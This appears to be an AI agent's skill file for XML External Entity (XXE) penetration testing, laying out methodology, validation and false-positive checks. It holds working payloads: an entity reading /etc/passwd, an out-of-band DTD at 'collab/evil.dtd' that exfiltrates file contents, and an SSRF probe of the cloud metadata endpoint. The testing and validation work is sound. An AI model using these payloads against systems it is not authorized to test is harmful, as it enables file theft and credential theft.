---
name: xxe
description: XML External Entity testing (CWE-611, WSTG-INPV-07). Use on any XML/SOAP/SAML/SVG/DOCX/SVG ingest point.
allowed-tools: Read, Grep, Glob, Bash
---

# XXE Skill (CWE-611)

XML parsers that resolve external entities allow file read, SSRF, and sometimes
RCE/DoS. Often hides in non-obvious XML: SOAP, SAML, SVG uploads, DOCX/XLSX,
RSS, and APIs that accept `Content-Type: application/xml` even if they normally take JSON.

## Prerequisites
- An endpoint that parses XML. Try switching a JSON endpoint to XML
  (`Content-Type: application/xml` with an XML body) — many accept both.

## Methodology

### Step 1: Classic file read
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```
Place `&x;` where a value reflects in the response.

### Step 2: Blind / out-of-band (OOB)
When nothing reflects, use an external DTD on your collaborator to exfiltrate via
parameter entities:
```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://collab/evil.dtd"> %p;]>
```
DTD reads a file and sends it to your server. Confirms blind XXE.

### Step 3: SSRF
`SYSTEM "http://169.254.169.254/latest/meta-data/"` or internal hosts.

### Step 4: Format-borne XXE
Embed the DOCTYPE in an uploaded SVG / DOCX / SAML response.

## Payloads / wordlists
XXE DTD templates; `specter/wordlists/`.

## Validate (negative control)
- **Attack:** reflect file content, or capture the OOB callback (DNS/HTTP) carrying
  the file — proof the parser resolved your external entity.
- **Negative control:** the same request WITHOUT the DOCTYPE/entity returns normally
  and produces NO callback. That isolates entity resolution as the cause.

## Evidence to capture
The XML payload, the reflected content or the collaborator log entry (with the
exfiltrated data / requesting IP), and the clean-control request.

## False-positive traps
- Parser echoes your entity literally (`&x;` as text) — not resolved.
- A WAF callback rather than the target (check the source IP/host).
- Error mentioning DOCTYPE but no read/SSRF achieved.

## Validate & Promote

Findings from this skill are born `theoretical` (see the repo-root `CLAUDE.md`). Promote via `scripts/validate-finding.sh` only after a reflected read or an OOB callback.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method out-of-band \
  --negative-control "DOCTYPE+entity yields /etc/passwd via collaborator hit; identical body without DOCTYPE = no callback" --by specter
```
